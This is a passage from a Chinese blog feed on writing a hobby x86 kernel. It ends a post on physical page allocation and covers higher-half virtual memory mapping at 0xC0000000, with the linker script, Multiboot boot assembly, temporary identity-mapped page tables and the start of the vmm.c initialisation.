class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line">    allc_addr = pmm_alloc_page();</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line">    allc_addr = pmm_alloc_page();</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line">    allc_addr = pmm_alloc_page();</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240514210241195.png" alt="image-20240514210241195" style="zoom:150%;">

<p>因为是用栈 进行管理的，所以最先分配的物理内存地址是高地址 </p>
<p><img src="/2024/05/12/x86-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240514210512354.png" alt="image-20240514210512354"></p>
]]></content>
      <categories>
        <category>x86内核实现</category>
      </categories>
      <tags>
        <tag>x86</tag>
        <tag>linxu</tag>
        <tag>内核</tag>
      </tags>
  </entry>
  <entry>
    <title>x86-6-虚拟内存管理的实现</title>
    <url>/2024/05/14/x86-6-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="10-虚拟内存管理的实现"><a href="#10-虚拟内存管理的实现" class="headerlink" title="10.虚拟内存管理的实现"></a>10.虚拟内存管理的实现</h1><h2 id="1-段页式内存管理"><a href="#1-段页式内存管理" class="headerlink" title="1.段页式内存管理"></a>1.段页式内存管理</h2><blockquote>
<p>虚拟地址到物理地址通过由<strong>页目录和页表组成的二级页表映射</strong>，页目录的地址放置在CR3寄存器里。</p>
<img src="/2024/05/14/x86-6-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240513203948806.png" alt="image-20240513203948806" style="zoom:67%;">
</blockquote>
<p><strong>段页式内存管理：</strong></p>
<img src="/2024/05/14/x86-6-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0/image-20240515100322404.png" alt="image-20240515100322404" style="zoom:80%;">

<p><strong>该过程需要三次访问内存</strong>，为提高执行速度，可以增加一个快表，访问数据时利用段号和页号检索它，若可以命中，直接取出物理帧号；否则，进行上述三次内存访问过程获得数据。</p>
<ul>
<li>将进程按照逻辑模块分段，然后再将各段分页</li>
<li>段页式管理外部采用段的优点，即<strong>用户可根据逻辑功能进行分段</strong>，内部采用页的优点，<strong>进行系统的固定分页，取消了段的长度不等造成的开销，由固定大小的页代替，提高内存利用率</strong></li>
</ul>
<p><strong>段页式内存管理的优点</strong>：<strong>段式使得内存分配更灵活，页式使得内存碎片减少，段页式内存管理可以方便地重用内存页，提高内存利用效率。</strong></p>
<ol>
<li><strong>灵活的内存分配</strong>：<ul>
<li>段页式内存管理允许将内存分成逻辑段，每个段可以独立地增长和缩减。这种灵活性使得程序可以按需分配内存，从而提高内存利用率。</li>
</ul>
</li>
<li><strong>内存保护</strong>：<ul>
<li>每个段都有独立的段描述符，描述符中包含了段的基址、大小和访问权限。这种机制可以防止进程之间的内存越界访问，提高系统的稳定性和安全性。</li>
</ul>
</li>
<li><strong>简化的地址空间</strong>：<ul>
<li>段页式内存管理将逻辑地址转换为物理地址时，先通过段表找到段，再通过页表找到页框。这种两级映射简化了内存管理，便于操作系统管理多个进程的内存。</li>
</ul>
</li>
<li><strong>减少内存碎片</strong>：<ul>
<li><strong>页式内存管理可以有效地减少内存碎片，因为它将内存分成固定大小的页框</strong>。段页式内存管理继承了这一优点，从而减少了内存分配和释放过程中产生的内存碎片。</li>
</ul>
</li>
<li><strong>虚拟内存支持</strong>：<ul>
<li>段页式内存管理可以与虚拟内存机制结合使用，支持将不常用的内存页交换到磁盘上，从而扩展系统的有效内存容量。这种机制可以提高系统的多任务处理能力，允许更多的进程同时运行。</li>
</ul>
</li>
<li><strong>模块化编程</strong>：<ul>
<li>段页式内存管理支持模块化编程，程序员可以将程序分成多个逻辑段（如代码段、数据段、堆栈段等），每个段可以独立管理。这种方式有助于程序的开发和维护。</li>
</ul>
</li>
<li><strong>共享和重用</strong>：<ul>
<li>操作系统可以允许不同的进程共享同一个段（如共享库或代码段），从而节省内存空间。此外，<strong>段页式内存管理可以方便地重用内存页，提高内存利用效率。</strong></li>
</ul>
</li>
</ol>
<h2 id="2-内存映射"><a href="#2-内存映射" class="headerlink" title="2.内存映射"></a>2.内存映射</h2><p>Linux采用的方案是 把<strong>内核映射到线性地址空间3G以上</strong>，而<strong>应用程序占据线性地址空间0-3G的位置</strong>。我们的内 核采取和Linux内核一样的映射，把物理地址0从虚拟地址<strong>0xC0000000（3G）</strong>处开始往上映 射，因为我们只管理最多512MB的内存，所以3G-4G之间能完全的映射全部的物理地址。</p>
<p>物理地址和内核虚拟地址满足以下的关系：</p>
<p><strong>物理地址 + 0xC0000000 &#x3D; 内核虚拟地址</strong></p>
<blockquote>
<p>VMA（Virtual Memory Address）：链接器生成可执行文件时的偏移计算地址，</p>
<p>LMA（Load Memory Address）：区段所载入内存的 实际地址</p>
<p>通常情况下，VMA &#x3D; LMA</p>
<p>问题：如果简单的 把0xC0100000 修改为代码段的起始位置，那么会报错， 因为GRUB是从1MB处加载内核的，而链接器是以0xC0100000这个参考地址进行地址重定位的。<strong>此时尚未开启虚拟页面映射，运行 涉及到寻址的代码肯定就会出错。</strong>— 链接器将内核重定位到虚拟地址 <code>0xC0100000</code>，但是在虚拟地址映射启用之前，所有的内存访问都是物理地址。直接访问 <code>0xC0100000</code> 会导致访问失败，因为该地址在物理内存中没有对应的实际位置</p>
<p>解决方案：有一段程序和数据按照 0x100000的地址进行重定位，能帮助我们设置好一个临时的页表，再跳转到内核入口函数</p>
<p>GCC提供了这样的扩展机制：允许程序员指定某个函数或者某个变量所存储的区段。 同时ld的链接脚本又可以自由定制，所以这个无解的问题就有了解决方案。<strong>用于设置这个 临时页表和函数我们指定它存储在.init段，只需要指定该段从0x100000地址开始</strong>，<strong>其他 的.text和.data等段按照0xC0100000作为起始地址即可</strong>。当然这里还有要注意的细节， 具体在下面的新链接脚本中可以看。</p>
</blockquote>
<blockquote>
<p>script&#x2F;kernel.ld 链接器脚本修改</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENTRY(start)</span><br><span class="line">SECTIONS</span><br><span class="line">&#123;</span><br><span class="line">	PROVIDE( kern_start = 0xC0100000);</span><br><span class="line">	. = 0x100000; </span><br><span class="line">	.init.text : </span><br><span class="line">	&#123;</span><br><span class="line">		*(.init.text)</span><br><span class="line">		. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line">	.init.data : </span><br><span class="line">	&#123;</span><br><span class="line">		*(.init.data)</span><br><span class="line">		. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	. += 0xC0000000;</span><br><span class="line">	.text : AT(ADDR(.text) - 0xC0000000)</span><br><span class="line">	&#123;</span><br><span class="line">		*(.text)</span><br><span class="line">		. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line">	.data : AT(ADDR(.data) - 0xC0000000)</span><br><span class="line">	&#123;</span><br><span class="line">		*(.data)</span><br><span class="line">		*(.rodata)</span><br><span class="line">		. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line">	.bss : AT(ADDR(.bss) - 0xC0000000)</span><br><span class="line">	&#123;</span><br><span class="line">		*(.bss)</span><br><span class="line">		. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line">	.stab : AT(ADDR(.stab) - 0xC0000000)</span><br><span class="line">	&#123;</span><br><span class="line">		*(.stab)</span><br><span class="line">		. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line">	.stabstr : AT(ADDR(.stabstr) - 0xC0000000)</span><br><span class="line">	&#123;</span><br><span class="line">		*(.stabstr)</span><br><span class="line">	 	. = ALIGN(4096);</span><br><span class="line">	&#125;</span><br><span class="line">	PROVIDE( kern_end = . );</span><br><span class="line">	</span><br><span class="line">	/DISCARD/ : &#123; *(.comment) *(.eh_frame) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>. +&#x3D; 0xC0000000; 从这里开始是虚拟地址的映射</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">. += <span class="number">0xC0000000</span>;</span><br><span class="line">	.text : <span class="built_in">AT</span>(<span class="built_in">ADDR</span>(.text) - <span class="number">0xC0000000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		*(.text)</span><br><span class="line">		. = <span class="built_in">ALIGN</span>(<span class="number">4096</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>AT(ADDR(.text) - 0xC0000000)</code>**：指定 <code>.text</code> 段的加载地址（物理地址）为当前虚拟地址减去 <code>0xC0000000</code>。这意味着虚拟地址 <code>0xC0100000</code> 的代码实际加载在物理地址 <code>0x100000</code>。</li>
<li>**<code>\*(.text)</code>**：将所有 <code>.text</code> 段的内容放入此处。</li>
<li>**<code>. = ALIGN(4096)</code>**：将下一个地址对齐到 4096 字节（4KB）的边界</li>
</ul>
<blockquote>
<p>boot&#x2F;boot.s 修改入口函数</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; ----------------------------------------------------------------</span><br><span class="line">;</span><br><span class="line">; 	boot.s -- 内核从这里开始</span><br><span class="line">;</span><br><span class="line">;                 这里还有根据 GRUB Multiboot 规范的一些定义</span><br><span class="line">;</span><br><span class="line">; ----------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">MBOOT_HEADER_MAGIC 	equ 	0x1BADB002 	; Multiboot 魔数，由规范决定的</span><br><span class="line"></span><br><span class="line">MBOOT_PAGE_ALIGN 	equ 	1 &lt;&lt; 0    	; 0 号位表示所有的引导模块将按页(4KB)边界对齐</span><br><span class="line">MBOOT_MEM_INFO 		equ 	1 &lt;&lt; 1    	; 1 号位通过 Multiboot 信息结构的 mem_* 域包括可用内存的信息</span><br><span class="line">						; (告诉GRUB把内存空间的信息包含在Multiboot信息结构中)</span><br><span class="line"></span><br><span class="line">; 定义我们使用的 Multiboot 的标记</span><br><span class="line">MBOOT_HEADER_FLAGS 	equ 	MBOOT_PAGE_ALIGN | MBOOT_MEM_INFO</span><br><span class="line"></span><br><span class="line">; 域checksum是一个32位的无符号值，当与其他的magic域(也就是magic和flags)相加时，</span><br><span class="line">; 要求其结果必须是32位的无符号值 0 (即magic + flags + checksum = 0)</span><br><span class="line">MBOOT_CHECKSUM 		equ 	- (MBOOT_HEADER_MAGIC + MBOOT_HEADER_FLAGS)</span><br><span class="line"></span><br><span class="line">; 符合Multiboot规范的 OS 映象需要这样一个 magic Multiboot 头</span><br><span class="line"></span><br><span class="line">; Multiboot 头的分布必须如下表所示：</span><br><span class="line">; ----------------------------------------------------------</span><br><span class="line">; 偏移量  类型  域名        备注</span><br><span class="line">;</span><br><span class="line">;   0     u32   magic       必需</span><br><span class="line">;   4     u32   flags       必需 </span><br><span class="line">;   8     u32   checksum    必需 </span><br><span class="line">;</span><br><span class="line">; 我们只使用到这些就够了，更多的详细说明请参阅 GNU 相关文档</span><br><span class="line">;-----------------------------------------------------------</span><br><span class="line"></span><br><span class="line">;-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">[BITS 32]  	; 所有代码以 32-bit 的方式编译</span><br><span class="line"></span><br><span class="line">section .init.text 	; 临时代码段从这里开始</span><br><span class="line"></span><br><span class="line">; 在代码段的起始位置设置符合 Multiboot 规范的标记</span><br><span class="line"></span><br><span class="line">dd MBOOT_HEADER_MAGIC 	; GRUB 会通过这个魔数判断该映像是否支持</span><br><span class="line">dd MBOOT_HEADER_FLAGS   ; GRUB 的一些加载时选项，其详细注释在定义处</span><br><span class="line">dd MBOOT_CHECKSUM       ; 检测数值，其含义在定义处</span><br><span class="line"></span><br><span class="line">[GLOBAL start] 		; 内核代码入口，此处提供该声明给 ld 链接器</span><br><span class="line">[GLOBAL mboot_ptr_tmp] 	; 全局的 struct multiboot * 变量</span><br><span class="line">[EXTERN kern_entry] 	; 声明内核 C 代码的入口函数</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">	cli  				; 此时还没有设置好保护模式的中断处理，所以必须关闭中断</span><br><span class="line">	mov [mboot_ptr_tmp], ebx	; 将 ebx 中存储的指针存入 glb_mboot_ptr 变量</span><br><span class="line">	mov esp, STACK_TOP  		; 设置内核栈地址，按照 multiboot 规范，当需要使用堆栈时，OS 映象必须自己创建一个</span><br><span class="line">	and esp, 0FFFFFFF0H		; 栈地址按照 16 字节对齐</span><br><span class="line">	mov ebp, 0 			; 帧指针修改为 0</span><br><span class="line">    </span><br><span class="line">	call kern_entry	; 调用内核入口函数</span><br><span class="line"></span><br><span class="line">;-----------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">section .init.data		; 开启分页前临时的数据段</span><br><span class="line">stack:    times 1024 db 0  	; 这里作为临时内核栈</span><br><span class="line">STACK_TOP equ $-stack-1 	; 内核栈顶，$ 符指代是当前地址</span><br><span class="line"></span><br><span class="line">mboot_ptr_tmp: dd 0		; 全局的 multiboot 结构体指针</span><br><span class="line"></span><br><span class="line">;-----------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>主要的修改是第5行的代码所在段声明和第29行的数据所在段声明，因为此处代码和 数据是在<strong>参考0x100000（1MB）编址的</strong>。<strong>所以在进入分页后需要更换新的内核栈和新的 multiboot结构体指针</strong>。除此之外，仍就需要指定kern_entry函数所在区段为.init.text 段，并且在该函数中建立临时页表并跳转到高虚拟地址处的kern_init函数正式执行</p>
<blockquote>
<p>init&#x2F;entry.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;console.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;gdt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;timer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核初始化函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">kern_init</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开启分页机制后的multiboot指针</span></span><br><span class="line"><span class="type">multiboot_t</span> *glb_mboot_ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开启分页机制后的内核栈</span></span><br><span class="line"><span class="type">char</span> kern_stack[STACK_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核使用的临时页表和页目录</span></span><br><span class="line"><span class="comment">// 该地址必须是页对齐的地址，内存 0−640KB 肯定是空闲的</span></span><br><span class="line"></span><br><span class="line">__attribute__((section(<span class="string">&quot;.init.data&quot;</span>))) <span class="type">pgd_t</span> *pgd_tmp = (<span class="type">pgd_t</span> *)<span class="number">0x1000</span>;</span><br><span class="line">__attribute__((section(<span class="string">&quot;.init.data&quot;</span>))) <span class="type">pgd_t</span> *pte_low = (<span class="type">pgd_t</span> *)<span class="number">0x2000</span>;</span><br><span class="line">__attribute__((section(<span class="string">&quot;.init.data&quot;</span>))) <span class="type">pgd_t</span> *pte_hign = (<span class="type">pgd_t</span> *)<span class="number">0x3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核入口函数</span></span><br><span class="line">__attribute__((section(<span class="string">&quot;.init.text&quot;</span>))) <span class="type">void</span> <span class="title function_">kern_entry</span><span class="params">()</span>&#123;</span><br><span class="line">    pgd_tmp[<span class="number">0</span>] = (<span class="type">uint32_t</span>)pte_low | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line">	pgd_tmp[PGD_INDEX(PAGE_OFFSET)] = (<span class="type">uint32_t</span>)pte_hign | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 映射内核虚拟地址 4MB 到物理地址的前 4MB</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++) &#123;</span><br><span class="line">		pte_low[i] = (i &lt;&lt; <span class="number">12</span>) | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 映射 0x00000000-0x00400000 的物理地址到虚拟地址 0xC0000000-0xC0400000</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++) &#123;</span><br><span class="line">		pte_hign[i] = (i &lt;&lt; <span class="number">12</span>) | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 设置临时页表</span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;mov %0, %%cr3&quot;</span> : : <span class="string">&quot;r&quot;</span> (pgd_tmp))</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> cr0;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 启用分页，将 cr0 寄存器的分页位置为 1 就好</span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;mov %%cr0, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (cr0))</span>;</span><br><span class="line">	cr0 |= <span class="number">0x80000000</span>; <span class="comment">// 1000 0000 0000 0000 0000 0000 0000 0000</span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;mov %0, %%cr0&quot;</span> : : <span class="string">&quot;r&quot;</span> (cr0))</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 切换内核栈</span></span><br><span class="line">	<span class="type">uint32_t</span> kern_stack_top = ((<span class="type">uint32_t</span>)kern_stack + STACK_SIZE) &amp; <span class="number">0xFFFFFFF0</span>;</span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;mov %0, %%esp\n\t&quot;</span></span></span><br><span class="line"><span class="params">			<span class="string">&quot;xor %%ebp, %%ebp&quot;</span> : : <span class="string">&quot;r&quot;</span> (kern_stack_top))</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 更新全局 multiboot_t 指针</span></span><br><span class="line">	glb_mboot_ptr = mboot_ptr_tmp + PAGE_OFFSET;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 调用内核初始化函数</span></span><br><span class="line">	kern_init();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kern_init</span><span class="params">()</span>&#123;</span><br><span class="line">    init_debug();</span><br><span class="line">    init_gdt();</span><br><span class="line">    init_idt();</span><br><span class="line"></span><br><span class="line">    console_clear();</span><br><span class="line">	<span class="comment">//console_write_color(&quot;Hello, OS kernel!\n&quot;, rc_black, rc_green);</span></span><br><span class="line">    <span class="comment">//panic(&quot;test&quot;);</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    printk_color(rc_black, rc_green, <span class="string">&quot;Hello OS!!!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    init_timer(<span class="number">200</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// `sti` 指令的作用是设置中断标志（Set Interrupt Flag）</span></span><br><span class="line">    <span class="comment">// asm volatile(&quot;sti&quot;);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 显示物理内存布局</span></span><br><span class="line">    printk(<span class="string">&quot;kernel in memory start: 0x%08X\n&quot;</span>, kern_start);</span><br><span class="line">    printk(<span class="string">&quot;kernel in memory end: 0x%08X\n&quot;</span>, kern_end);</span><br><span class="line">    printk(<span class="string">&quot;kernel in memory used: %d KB\n\n&quot;</span>, (kern_end - kern_start + <span class="number">1023</span>) / <span class="number">1024</span>); <span class="comment">// 换算成kb</span></span><br><span class="line"></span><br><span class="line">    show_memory_map();</span><br><span class="line">    <span class="comment">// 初始化物理内存管理</span></span><br><span class="line">    init_pmm();</span><br><span class="line"></span><br><span class="line">    printk_color(rc_black, rc_red, <span class="string">&quot;\nThe Count of Physical Memory Page is: %u\n\n&quot;</span>, phy_page_count); <span class="comment">// 栈中分配的物理也的大小</span></span><br><span class="line">    <span class="type">uint32_t</span> allc_addr = <span class="literal">NULL</span>;</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Test Physical Memory Alloc :\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    allc_addr = pmm_alloc_page(); <span class="comment">// 分配一个页 物理内存</span></span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line">    allc_addr = pmm_alloc_page();</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line">    allc_addr = pmm_alloc_page();</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line">    allc_addr = pmm_alloc_page();</span><br><span class="line">    printk_color(rc_black, rc_light_brown , <span class="string">&quot;Alloc Physical Addr: 0x%08X\n&quot;</span>,allc_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;hlt&quot;</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解析：</strong></p>
<p> <code>__attribute__((section(&quot;.init.data&quot;)))</code> 是GCC编译器的扩展功能， 用来指定变量或者函数的存储区段。</p>
<blockquote>
<ul>
<li>将虚拟地址 <code>0xC0000000</code>（高端虚拟地址，通常对应于内核的虚拟地址空间）开始的 4MB 映射到物理地址 <code>0-4MB</code>。</li>
<li>同时将虚拟地址 <code>0-4MB</code> 直接映射到物理地址 <code>0-4MB</code>。这称为“<strong>恒等映射”（identity mapping）。</strong></li>
</ul>
<p>理解：</p>
<ul>
<li>当启用分页（通过将 <code>CR0</code> 寄存器的最高位置为 1）时，CPU <em><strong>立即</strong></em>开始按照分页机制来进行内存寻址。</li>
<li>如果没有进行恒等映射，CPU 将无法正确地执行当前正在运行的代码，因为这些代码在启用分页之前是以物理地址方式访问内存的。</li>
<li>在启用分页之前，<code>kern_entry</code> 函数及其调用的代码是按物理地址访问的。</li>
<li>一旦启用分页，所有内存访问都将基于页表进行。为了确保在切换过程中代码可以继续运行，必须保证这些地址的映射是正确的</li>
</ul>
</blockquote>
<p><strong>也就是说 当CR0 最高位置1 的时候也就是 启动分页时，这之前都运行在物理内存，一旦启用分页将会立马切换到分页模式，为了保证当前代码能够顺利进行，也会将物理的地址的0-4MB 同时映射到 虚拟地址的0-4MB 和  虚拟地址的高端地址 0xC0000000的4MB上</strong>，低端恒等映射的主要目的是确保在分页机制切换过程中，所有正在执行的代码地址依旧有效。</p>
<blockquote>
<p>include&#x2F;multiboot.h 更新声明</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声明全局的 multiboot_t * 指针</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">multiboot_t</span> *glb_mboot_ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明全局的multiboot 指针</span></span><br><span class="line"><span class="comment">// 内核未建立分页机制前缓存的指针</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">multiboot_t</span> *mboot_ptr_tmp;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>drivers&#x2F;console.c 修改文本模式下显存的起始位置，原先的地址0xB8000 加上偏移地址 0xC0000000 才能在分页模式下访问到</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"><span class="comment">// VGA 的显示缓冲的起点 0xB8000 需要加上分页地址</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint16_t</span> *video_memory = (<span class="type">uint16_t</span> *)(<span class="number">0xB8000</span> + PAGE_OFFSET);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>kern&#x2F;debug&#x2F;elf.c 低端内存地址 也需要更改  libs&#x2F;elf.c</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">elf_t</span> <span class="title function_">elf_from_multiboot</span><span class="params">(<span class="type">multiboot_t</span> *mb)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="type">elf_t</span> elf;</span><br><span class="line">	<span class="type">elf_section_header_t</span> *sh = (<span class="type">elf_section_header_t</span>*)mb-&gt;addr;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> shstrtab = sh[mb-&gt;shndx].addr;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; mb-&gt;num; i++) &#123;</span><br><span class="line">		<span class="type">const</span> <span class="type">char</span> *name = (<span class="type">const</span> <span class="type">char</span> *)(shstrtab + sh[i].name) + PAGE_OFFSET;</span><br><span class="line">		<span class="comment">// 在 GRUB 提供的 multiboot 信息中寻找内核 ELF 格式所提取的字符串表和符号表</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(name, <span class="string">&quot;.strtab&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			elf.strtab = (<span class="type">const</span> <span class="type">char</span> *)sh[i].addr + PAGE_OFFSET;</span><br><span class="line">			elf.strtabsz = sh[i].size;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(name, <span class="string">&quot;.symtab&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			elf.symtab = (<span class="type">elf_symbol_t</span>*)(sh[i].addr + PAGE_OFFSET);</span><br><span class="line">			elf.symtabsz = sh[i].size;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> elf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>mm&#x2F;vmm.c  虚拟内存管理的初始化</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核页目录区域</span></span><br><span class="line"><span class="type">pgd_t</span> pgd_kern[PGD_SIZE] __attribute__ ((aligned(PAGE_SIZE)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核页表区域</span></span><br><span class="line"><span class="type">static</span> <span class="type">pte_t</span> pte_kern[PTE_COUNT][PTE_SIZE] __attribute__ ((aligned(PAGE_SIZE)));</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_vmm</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 0xC0000000 这个地址在页目录的索引</span></span><br><span class="line">	<span class="type">uint32_t</span> kern_pte_first_idx = PGD_INDEX(PAGE_OFFSET);</span><br><span class="line">	</span><br><span class="line">	<span class="type">uint32_t</span> i, j;</span><br><span class="line">	<span class="keyword">for</span> (i = kern_pte_first_idx, j = <span class="number">0</span>; i &lt; PTE_COUNT + kern_pte_first_idx; i++, j++) &#123;</span><br><span class="line">		<span class="comment">// 此处是内核虚拟地址，MMU 需要物理地址，所以减去偏移，下同</span></span><br><span class="line">		pgd_kern[i] = ((<span class="type">uint32_t</span>)pte_kern[j] - PAGE_OFFSET) | PAGE_PRESENT | PAGE_WRITE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span> *pte = (<span class="type">uint32_t</span> *)pte_kern;</span><br><span class="line">	<span 